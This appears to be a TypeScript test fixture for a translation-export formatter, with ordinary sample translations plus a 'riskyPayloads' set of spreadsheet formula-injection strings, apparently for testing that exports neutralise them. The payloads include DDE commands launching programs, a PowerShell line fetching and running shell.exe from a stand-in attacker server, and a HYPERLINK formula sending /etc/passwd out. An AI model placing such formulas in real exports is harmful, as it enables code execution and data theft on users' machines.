import * as fs from 'fs';
import { IntermediateTranslationFormat } from '../../domain/formatters';

export const loadFixture = (name: string) => {
  return fs.readFileSync(`src/formatters/fixtures/${name}`, { encoding: 'utf-8' });
};

export const simpleFormatFixture: IntermediateTranslationFormat = {
  translations: [
    {
      term: 'term.one',
      translation: 'Current Plan: {{ project.plan.name }}',
    },
    {
      term: 'term two',
      translation: '{VAR_PLURAL, plural, =0 {locales} =1 {locale} other {locales} }',
    },
    {
      term: 'TERM_THREE',
      translation: 'Export format...',
    },
    {
      term: 'term:four',
      translation: `hello there you\\nthis should be in a newline`,
    },
  ],
};

export const riskyPayloads: IntermediateTranslationFormat = {
  translations: [
    {
      term: 'DDE ("cmd";"/C calc";"!A0")A0',
      translation: 'first',
    },
    {
      term: `@SUM(1+9)*cmd|' /C calc'!A0`,
      translation: `second`,
    },
    {
      term: `=10+20+cmd|' /C calc'!A0`,
      translation: `third`,
    },
    {
      term: `=cmd|' /C notepad'!'A1'`,
      translation: `fourth`,
    },
    {
      term: `=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0`,
      translation: `fifth`,
    },
    {
      term: `=HYPERLINK(CONCATENATE("http://0.0.0.0:80/123.txt?v="; ('file:///etc/passwd'#$passwd.A1));"test-poc")`,
      translation: `sixth`,
    },
  ],
};
